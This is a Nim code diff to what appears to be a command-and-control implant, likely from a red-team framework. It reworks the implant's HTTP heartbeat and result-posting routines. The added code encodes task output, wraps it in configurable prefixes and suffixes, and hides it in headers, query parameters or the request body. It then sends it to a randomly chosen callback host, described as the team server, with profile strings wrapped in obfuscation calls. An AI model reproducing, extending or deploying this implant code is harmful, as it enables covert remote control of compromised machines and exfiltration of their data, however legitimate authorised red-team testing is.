@@ -32,7 +32,7 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
     case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
     of protect("header"): 
         client.headers.add(ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name")), payload)
-    of protect("parameter"):
+    of protect("query"):
         let param = ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name"))
         endpoint &= fmt"{param}={payload}&"
     of protect("uri"):
@@ -94,20 +94,49 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
     # Select a random endpoint to make the request to
     var endpoint = ctx.profile.getString(protect("http-post.endpoints"))
     if endpoint[0] == '/': 
-        endpoint = endpoint[1..^1]
+        endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters
     
     let requestMethod = parseEnum[HttpMethod](ctx.profile.getString(protect("http-post.request-methods"), protect("POST")))
 
-    let body = Bytes.toString(data)
-
     # Apply data transformation
+    var output: string
+    case ctx.profile.getString(protect("http-post.agent.output.encoding.type"), default = protect("none"))
+    of protect("base64"): 
+        output = encode(data, safe = ctx.profile.getBool(protect("http-post.agent.output.encoding.url-safe"))).replace("=", "")
+    of protect("none"): 
+        output = Bytes.toString(data)
+    
+    # Append/prepend strings
+    let 
+        prefix = ctx.profile.getString(protect("http-post.agent.output.prefix"))
+        suffix = ctx.profile.getString(protect("http-post.agent.output.suffix"))
+        payload = prefix & output & suffix
+    var body: string
+
+    # Add task result to the request
+    case ctx.profile.getString(protect("http-post.agent.output.placement.type")): 
+    of protect("header"): 
+        client.headers.add(ctx.profile.getString(protect("http-post.agent.output.placement.name")), payload)
+    of protect("query"):
+        let param = ctx.profile.getString(protect("http-post.agent.output.placement.name"))
+        endpoint &= fmt"{param}={payload}&"
+    of protect("uri"):
+        discard
+    of protect("body"): 
+        body = payload  # Set the request body to the "prefix & task output & suffix" construct
+    else:
+        discard 
+        
+    # Define additional request parameters
+    for param, value in ctx.profile.getTable(protect("http-post.agent.parameters")): 
+        endpoint &= fmt"{param}={value.getStringValue()}&"
 
     try:
         # Send post request to team server
         # Select random callback host
         let hosts = ctx.hosts.split(";")
         let host = hosts[rand(hosts.len() - 1)]
-        discard waitFor client.request(fmt"http://{host}/{endpoint}", requestMethod, body)
+        discard waitFor client.request(fmt"http://{host}/{endpoint[0..^2]}", requestMethod, body)
     
     except CatchableError as err:
         print "[-] ", err.msg 
